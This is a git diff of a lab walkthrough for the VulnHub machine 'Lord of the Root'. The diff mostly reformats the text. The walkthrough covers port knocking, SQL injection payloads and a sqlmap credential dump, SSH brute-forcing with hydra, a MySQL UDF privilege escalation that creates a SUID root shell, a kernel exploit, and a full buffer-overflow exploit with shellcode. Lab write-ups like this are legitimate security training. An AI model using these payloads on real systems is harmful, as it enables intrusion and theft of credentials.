@@ -8,7 +8,9 @@ image:
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
+
 # Overview
+
 This machine begins w/ SSH revealing a port knocking sequence, allowing us to open an additional port TCP/1337 running HTTP. The webpage has a login page that is susceptible to SQLi, allowing us to enumerate the Webapp database revealing several credentials. With the credentials, we are able to bruteforce SSH and obtain a shell.
 
 There are 3 ways to obtain root, the easiest way is via a kernel exploit and can be done by downloading an exploit on exploit db.
@@ -20,15 +22,19 @@ The final way (hardest) is a buffer overflow vulnerability existing in the SUID 
 ---
 
 # Recon
+
 - Only TCP/22 (SSH) is up
 - Requires Port Knocking to open up ports
 
 ## TCP/22 (SSH) 
+
 ### Port Knocking
+
 1. Connect to SSH
 	![](Pasted%20image%2020220125010651.png)
 	- Could be port knocking?
 2. Port Knock
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
 	└─# knock -v $ip 1 2 3; 
@@ -36,7 +42,9 @@ The final way (hardest) is a buffer overflow vulnerability existing in the SUID 
 	hitting tcp 192.168.236.10:2
 	hitting tcp 192.168.236.10:3
 	```
+
 3. Check for newly opened ports
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
 	└─# nmap $ip -p-
@@ -51,8 +59,8 @@ The final way (hardest) is a buffer overflow vulnerability existing in the SUID 
 
 	Nmap done: 1 IP address (1 host up) scanned in 104.95 seconds
 	```
-	- `TCP/1337`
 
+	- `TCP/1337`
 
 ## TCP/1337 (HTTP)
 
@@ -77,9 +85,11 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
 Network Distance: 1 hop
 ```
+
 - `TCP/1337 (HTTP)`
 
 ### FFUF 
+
 ```
 ┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
 └─# ffuf -u http://$ip:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fw 21
@@ -113,6 +123,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 :: Progress: [18460/18460] :: Job [1/1] :: 4242 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
+
 - `404.html`
 - `images`
 - `index.html`
@@ -120,6 +131,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 # Initial Foothold
 
 ## TCP/80 (HTTP) - SQLi (Blind) Database Enumeration
+
 1. View enumerated directories
 	- `index.html`
 		![](Pasted%20image%2020220125013623.png)
@@ -131,6 +143,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 2. Download all images & Analyze for hidden text/file
 	- Could not find any
 3. Decode hidden text
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit]
 	└─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d
@@ -139,25 +152,33 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	└─# echo -n THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d | base64 -d
 	/978345210/index.phpbase64: invalid input
 	```
+
 	- `/978345210/index.php`
 4. Proceed to `/978345210/index.php`
 	![](Pasted%20image%2020220125015001.png)
 5. Tried to bruteforce it, did not work
 6. [Try SQLi Payloads](https://github.com/payloadbox/sql-injection-payload-list)
 7. Try Time Based SQLi
+
 	```
 	'or sleep(5)#
 	```
+
 	- It worked
-7. Try SQLi Auth Bypass payload
+8. Try SQLi Auth Bypass payload
+
 	```
 	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 	```
+
 	![](Pasted%20image%2020220125023505.png)
+
 	![](Pasted%20image%2020220125030816.png)
+
 	- Successfully login, could not do anything w/ the login apge
 	- Instead of Authentication Bypass, we have to enumerate the database
-8. Run SQLMap
+9. Run SQLMap
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
 	└─# sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap -v 5
@@ -180,7 +201,9 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	| 5  | AndMyAxe         | gimli    |
 	+----+------------------+----------+
 	```
-9. Create wordlist
+
+10. Create wordlist
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
 	└─# cat sqlmap/192.168.236.10/dump/Webapp/Users.csv | cut -d ',' -f2 | sed 's/password//g' | awk 'NF' > passwords.txt
@@ -202,10 +225,11 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	AndMySword
 	AndMyBow
 	```
-	
+
 ## TCP/22 (SSH) - Bruteforce
 
 1.  Bruteforce SSH
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/SQL]
 	└─# hydra -L usernames.txt -P passwords.txt ssh://$ip -e nsr
@@ -219,30 +243,39 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	1 of 1 target successfully completed, 1 valid password found
 	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 04:16:43
 	```
+
 	- smeagol:MyPreciousR00t
 2. Access SSH w/ smeagol:MyPreciousR00t
 	![](Pasted%20image%2020220125041805.png)
 
 # Privilege Escalation 
+
 ## Root - Via MySQL running as Root
+
 1. Linpeas
 	![](Pasted%20image%2020220125042356.png)
 2. Check ASLR
+
 	```
 	smeagol@LordOfTheRoot:/SECRET/door1$ cat /proc/sys/kernel/randomize_va_space
 	2
 	```
+
 	- ASLR is enabled, hard/unable to do BOF
 3. Check system processes running as root
+
 	```
 	smeagol@LordOfTheRoot:/SECRET/door1$ ps aux | grep root
 	...
 	root      1183  0.0  0.8 327004  8748 ?        Ssl  16:31   0:11 /usr/sbin/mysqld
 	...
 	```
+
 	![](Pasted%20image%2020220125050305.png)
+
 	- `mysqld` running as root
 4. Find SQL Credentials
+
 	```
 	smeagol@LordOfTheRoot:/var/www$ grep -Rnw $(pwd)/*/* -ie "sql" --color=always 2>/dev/null
 	
@@ -250,6 +283,7 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	/var/www/978345210/login.php:20:		//echo $sql;
 	/var/www/978345210/login.php:21:    
 	```
+
 	- `/var/www/978345210/login.php`
 5. View `login.php`
 	![](Pasted%20image%2020220125050453.png)
@@ -260,19 +294,26 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	- https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
 8. Exploit
 	1. Download `raptor_udf2.c`
+
 		```
 		wget https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
 		```
-	1. Compile `raptor_udf2.c`
+
+	2. Compile `raptor_udf2.c`
+
 		```
 		smeagol@LordOfTheRoot:/tmp$ gcc -g -c raptor_udf2.c
 		smeagol@LordOfTheRoot:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 		```
+
 	3. Access mysql
+
 		```
 		mysql -u root -p darkshadow
 		```
-	3. Import `raptor_udf.so`
+
+	4. Import `raptor_udf.so`
+
 		```
 		mysql> create table foo(line blob);
 		Query OK, 0 rows affected (0.00 sec)
@@ -294,12 +335,17 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 		+-----------+-----+----------------+----------+
 		1 row in set (0.00 sec)
 		```
-	4. Create rootbash
+
+	5. Create rootbash
+
 		```
 		select do_system('cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash');
 		```
+
 		![](Pasted%20image%2020220125162255.png)
+
 9. Check if `rootbash` exists
+
 	```
 	smeagol@LordOfTheRoot:/tmp$ ls -la
 	total 1004
@@ -314,9 +360,11 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	drwxrwxrwt  2 root    root      4096 Jan 25 07:52 .X11-unix
 	smeagol@LordOfTheRoot:/tmp$ 
 	```
+
 10. Obtain root shell
 	![](Pasted%20image%2020220125162422.png)
 11. Flag
+
 	```
 	rootbash-4.3# cat Flag.txt 
 	“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
@@ -333,15 +381,20 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 2. Find exploits for `3.19.0-25-generic, Ubuntu 14.04`
 	- https://www.exploit-db.com/exploits/39166
 3. Transfer to target & exploit
+
 	```
 	smeagol@LordOfTheRoot:/tmp$ nc 192.168.236.4 4444 > 39166.c
 	smeagol@LordOfTheRoot:/tmp$ gcc 39166.c -o exploit
 	smeagol@LordOfTheRoot:/tmp$ ./exploit
 	root@LordOfTheRoot:/tmp# 
 	```
+
 	![](Pasted%20image%2020220125180356.png)
+
 	
+
 ## Root - Via BufferOverflow
+
 - [Video Demo](https://youtu.be/qPBUKSKk5g4)
 	<iframe width="720" height="500" src="https://www.youtube.com/embed/qPBUKSKk5g4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
@@ -349,12 +402,15 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	- Via fuzzing
 	- Buffer Size: 200
 2.  Create msf-pattern
+
 	```
 	msf-pattern_create -l 200
 	Pattern:
 	run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
 	```
+
 3. Use `env`
+
 	```
 	env - gdb /SECRET/door3/file
 	show env
@@ -362,7 +418,9 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	unset env COLUMNS
 	show env
 	```
+
 4.  Determine Pattern Address & Return Address
+
 	```
 	# Determine Return Address 
 	# Address must not have badChars
@@ -374,29 +432,33 @@ index.html              [Status: 200, Size: 64, Words: 3, Lines: 4]
 	# Or you can just look at where program crashed <0xADDRESS in ?? ()>
 	i r eip
 	```
+
 	- Pattern Address: `0x41376641`
 	- Return Address: `0xbfb82e80`
 		- Little Endian: `\x80\x2e\xb8\xbf`
 5. Determine EIP offset
+
 	```
 	msf-pattern_offset -q 0x41376641
 	```
+
 	- EIP offset: 171
 6. Ensure EIP offset
+
 	```
 	run  $(python -c 'print "A" * 171 + "B" * 4 + "C" * 200')
 	```
+
 7. Shellcode
+
 	```
 	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/bof]
 	└─# cat shellcode | sed 's/"//g' | tr -d '\n'
 	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 	```
+
 8. Exploit
+
 	```
 	for x in {1..1000}; do env - /SECRET/door3/file $(python -c 'print "A"*171 + "\x80\x2e\xb8\xbf" + "\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); done
 	```
-
-	
-
-
